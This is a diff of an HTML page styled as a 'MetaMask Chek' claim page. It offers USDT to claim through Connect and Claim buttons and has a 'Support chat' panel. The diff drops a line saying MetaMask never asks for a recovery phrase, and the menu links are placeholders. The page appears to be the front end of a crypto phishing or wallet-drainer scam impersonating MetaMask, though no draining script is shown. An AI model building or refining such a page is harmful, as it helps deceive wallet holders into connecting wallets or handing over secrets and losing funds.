@@ -6,36 +6,50 @@
   <title>Check</title>
   <link rel="stylesheet" href="/styles.css" />
 </head>
+
 <body>
-  <!-- TOP (beige) -->
+  <!-- TOP AREA -->
   <div class="top">
     <header class="nav">
-      <div class="nav-left">
+      <!-- Logo (link) -->
+      <a class="logo-link" href="https://metamask.io" target="_blank" rel="noopener">
         <img class="logo" src="/assets/logo.svg" alt="logo" />
-        <nav class="menu">
-          <a class="menu-link" href="https://www.youtube.com/" target="_blank" rel="noopener">Features</a>
-          <a class="menu-link" href="https://www.youtube.com/" target="_blank" rel="noopener">About</a>
-          <a class="menu-link" href="https://www.youtube.com/" target="_blank" rel="noopener">Download</a>
-          <a class="menu-link" href="https://www.youtube.com/" target="_blank" rel="noopener">Support</a>
-        </nav>
-      </div>
+      </a>
 
-      <!-- Connect (dummy for now) -->
-      <button class="btn-connect" id="btnConnect" type="button">Connect</button>
+      <!-- Desktop menu pill -->
+      <nav class="menu desktop-only" aria-label="top menu">
+        <a class="menu-link" href="https://www.youtube.com/" target="_blank" rel="noopener">Features</a>
+        <a class="menu-link" href="https://www.google.com/" target="_blank" rel="noopener">About</a>
+        <a class="menu-link" href="https://www.wikipedia.org/" target="_blank" rel="noopener">Download</a>
+        <a class="menu-link" href="https://www.reddit.com/" target="_blank" rel="noopener">Support</a>
+      </nav>
+
+      <!-- Desktop Connect button -->
+      <button class="btn-connect desktop-only" id="btnConnect" type="button">Connect</button>
+
+      <!-- Mobile burger -->
+      <button class="burger mobile-only" id="burgerBtn" type="button" aria-label="Open menu" aria-expanded="false">
+        <span></span><span></span><span></span>
+      </button>
     </header>
 
+    <!-- Mobile dropdown menu -->
+    <div class="mobile-menu mobile-only" id="mobileMenu" aria-hidden="true">
+      <a class="menu-link" href="https://www.youtube.com/" target="_blank" rel="noopener">Features</a>
+      <a class="menu-link" href="https://www.google.com/" target="_blank" rel="noopener">About</a>
+      <a class="menu-link" href="https://www.wikipedia.org/" target="_blank" rel="noopener">Download</a>
+      <a class="menu-link" href="https://www.reddit.com/" target="_blank" rel="noopener">Support</a>
+    </div>
+
+    <!-- HERO CARD (background image) -->
     <main class="hero">
-      <div class="hero-left">
-        <div class="img-box">
-          <img class="img" src="/assets/hero.png" alt="hero" />
-        </div>
+      <div class="hero-bg" aria-hidden="true">
+        <img src="/assets/bg.png" alt="" />
       </div>
 
-      <div class="hero-center">
+      <div class="hero-content">
         <div class="check-title" id="checkTitle">MetaMask Chek #------</div>
-
         <div class="amount" id="amount">$0</div>
-
         <div class="currency" id="currency">currency: USDT</div>
 
         <button class="btn-claim" id="btnClaim" type="button">Claim</button>
@@ -44,87 +58,51 @@
           Warning: sharing your check link may result in loosing funds.
         </div>
       </div>
-
-      <div class="hero-right">
-        <div class="expires">
-          <div class="expires-label">EXPIRES IN</div>
-          <div class="expires-time" id="expires">11:59</div>
-        </div>
-      </div>
     </main>
-
-    <!-- Floating chat button -->
-    <button class="chat-fab" id="chatFab" type="button">
-      <span class="chat-fab-icon" aria-hidden="true">
-        <img src="/assets/support.svg" alt="" />
-      </span>
-      <span class="chat-fab-text">Chat</span>
-    </button>
-
-    <!-- Chat panel -->
-    <section class="chat-panel" id="chatPanel" aria-hidden="true">
-      <div class="chat-panel-head">
-        <div class="chat-panel-title">Support chat</div>
-        <button class="chat-close" id="chatClose" type="button">✕</button>
-      </div>
-
-      <div class="chat-messages" id="chatMessages"></div>
-
-      <div class="chat-input">
-        <input id="chatMsg" placeholder="Write to support…" />
-        <button id="chatSend" type="button">Send</button>
-      </div>
-    </section>
   </div>
 
-  <!-- GREEN SECTION -->
+  <!-- HOW IT WORKS -->
   <section class="how">
-    <div class="how-bar">
-      <div class="how-title">How it works?</div>
+    <h2 class="how-title">How MetaMask check works?</h2>
+
+    <!-- Desktop grid (2x2) -->
+    <div class="info-grid desktop-only">
+      <img class="info-img" src="/assets/info1.png" alt="info1" />
+      <img class="info-img" src="/assets/info2.png" alt="info2" />
+      <img class="info-img" src="/assets/info3.png" alt="info3" />
+      <img class="info-img" src="/assets/info4.png" alt="info4" />
     </div>
 
-    <div class="how-inner">
-      <div class="how-left">
-        <div class="img-box big">
-          <img class="img" src="/assets/instruction.png" alt="instruction" />
-        </div>
-      </div>
-
-      <div class="how-right">
-        <div class="how-text">
-          <div class="how-h">Someone created this Check</div>
-          <div>The sender locked funds in a smart contract and generated a unique claim link.</div>
-          <div>Anyone with this link can claim the funds once.</div>
-
-          <div class="how-h">Connect any wallet</div>
-          <div>To claim, connect a compatible wallet of your choice.</div>
-          <div>You don’t need to use MetaMask to receive the funds.</div>
-
-          <div class="how-h">Claim on-chain</div>
-          <div>When you tap Claim, a transaction is submitted on the network.</div>
-          <div>The funds are sent directly to your wallet address.</div>
-
-          <div class="how-h">One-time use</div>
-          <div>Each Chek can only be claimed once.</div>
-          <div>After it’s claimed or expires, the link becomes inactive.</div>
-        </div>
-      </div>
-
-      <div class="coin">
-        <img class="img" src="/assets/coin.png" alt="coin" />
-      </div>
-
-      <div class="know">
-        <div class="know-h">What you should know</div>
-        <div>MetaMask does not hold your funds</div>
-        <div>MetaMask cannot reverse or cancel a claimed Chek</div>
-        <div>MetaMask will never ask for your secret recovery phrase</div>
-        <div>If this Chek expires or is already claimed, the funds remain with the original sender.</div>
-      </div>
+    <!-- Mobile stack -->
+    <div class="info-stack mobile-only">
+      <img class="info-img-mobile" src="/assets/info1_mobile.png" alt="info1 mobile" />
+      <img class="info-img-mobile" src="/assets/info2_mobile.png" alt="info2 mobile" />
+      <img class="info-img-mobile" src="/assets/info3_mobile.png" alt="info3 mobile" />
+      <img class="info-img-mobile" src="/assets/info4_mobile.png" alt="info4 mobile" />
     </div>
   </section>
 
-  <!-- FOOTER -->
+  <!-- Floating chat button (circle icon only) -->
+  <button class="chat-fab" id="chatFab" type="button" aria-label="Open chat">
+    <img src="/assets/support.svg" alt="" />
+  </button>
+
+  <!-- Chat panel (same type as before) -->
+  <section class="chat-panel" id="chatPanel" aria-hidden="true">
+    <div class="chat-panel-head">
+      <div class="chat-panel-title">Support chat</div>
+      <button class="chat-close" id="chatClose" type="button">✕</button>
+    </div>
+
+    <div class="chat-messages" id="chatMessages"></div>
+
+    <div class="chat-input">
+      <input id="chatMsg" placeholder="Write to support…" />
+      <button id="chatSend" type="button">Send</button>
+    </div>
+  </section>
+
+  <!-- FOOTER (EXACT SAME AS BEFORE) -->
   <footer class="footer">
     <div class="footer-left">
       <div class="img-box foot">
@@ -134,7 +112,6 @@
 
     <div class="footer-center">
       <div class="socials">
-        <!-- pretend these exist (as you said). upload later into public/assets/social/ -->
         <a class="social" href="https://www.youtube.com/" target="_blank" rel="noopener"><img src="/assets/social/x.png" alt="x" /></a>
         <a class="social" href="https://www.youtube.com/" target="_blank" rel="noopener"><img src="/assets/social/github.png" alt="github" /></a>
         <a class="social" href="https://www.youtube.com/" target="_blank" rel="noopener"><img src="/assets/social/youtube.png" alt="youtube" /></a>
